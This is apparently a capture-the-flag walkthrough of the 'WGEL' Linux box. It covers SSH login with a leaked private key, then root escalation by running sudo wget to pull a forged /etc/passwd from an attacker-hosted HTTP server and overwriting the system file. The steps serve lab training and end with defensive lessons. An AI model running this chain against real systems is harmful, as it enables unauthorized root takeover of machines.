---
title: "HTB: WGEL Walkthrough"
date: "2025-10-01"
description: "My solution for the WGEL room, covering SSH key access and privilege escalation via sudo wget."
tags: ["htb", "writeup", "linux", "privilege-escalation"]
---

**By Stager** | FashilHack

## What is this machine

WGEL is a Linux box from Hack The Box that focuses on:
- SSH key usage
- A **sudo misconfiguration** (`wget`) leading to root access

## Target

```
IP: 10.10.10.237
OS: Linux
```

## Step 1 — Recon

After initial enumeration, an SSH private key (`id_rsa`) belonging to user `jessie` was discovered.

Before using the key, permissions must be fixed:

```bash
chmod 600 id_rsa.txt
```

📸 **Screenshot to add here:**
- Key discovery or permission fix

## Step 2 — User Access (jessie)

SSH into the target using the private key:

```bash
ssh -i id_rsa.txt jessie@10.10.10.237
```

List the home directory:

```bash
ls
```

Output:

```
Desktop  Documents  Downloads  examples.desktop  Music
Pictures  Public  Templates  Videos
```

📸 **Screenshot to add here:**
- Initial SSH access to jessie

## Step 3 — User Flag

Search for the user flag:

```bash
find ~ -type f -iname "*flag*" 2>/dev/null
```

Found:

```
./Documents/user_flag.txt
```

📸 **Screenshot to add here:**
- Reading the user flag

## Step 4 — Privilege Escalation Enumeration

Check sudo permissions:

```bash
sudo -l
```

Result shows `wget` can be executed with sudo privileges.

📸 **Screenshot to add here:**
- Output of sudo -l showing wget

## Step 5 — Root Privilege Escalation via wget

### Idea

If `wget` can be run with sudo, it can overwrite system files such as `/etc/passwd`.
By replacing the root password field with a known hash, root access can be obtained.

### Generate Password Hash (Attacker Machine)

```python
import bcrypt

password = "password".encode("utf-8")
hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())

print(hashed_password.decode())
```

### Prepare Modified `/etc/passwd`

Replace the root password placeholder (`x`) with the generated hash:

```
root:$2b$12$HASH_HERE:0:0:root:/root:/bin/bash
```

Save the file as `passwd`.

### Serve the File (Attacker)

```bash
python3 -m http.server 8000
```

### Backup Original passwd (Victim)

```bash
cp /etc/passwd /dev/shm/passwd.bak
```

### Overwrite `/etc/passwd`

```bash
sudo wget http://10.10.105.248:8000/passwd -O /etc/passwd
```

📸 **Screenshot to add here:**
- wget overwriting /etc/passwd

## Step 6 — Root Access

Switch to root:

```bash
su root
```

Password:

```
password
```

Root shell obtained.

## Full Attack Chain

```
Recon / Web Enum → SSH Private Key
  ↓
SSH Access as jessie
  ↓
PrivEsc Enum (sudo -l) → wget
  ↓
Generate hash & create modified /etc/passwd
  ↓
Overwite system /etc/passwd via sudo wget
  ↓
Switch user to root
```

## Key Takeaways

**1. Secure SSH keys**  
Always ensure private keys are not exposed to the web or unauthorized users.

**2. Sudo configurations must be restricted**  
Allowing a utility like `wget` to run via sudo allows attackers to download and overwrite critical system files and configurations.

_Stager — FashilHack — Simulating Attacks, Securing Businesses._
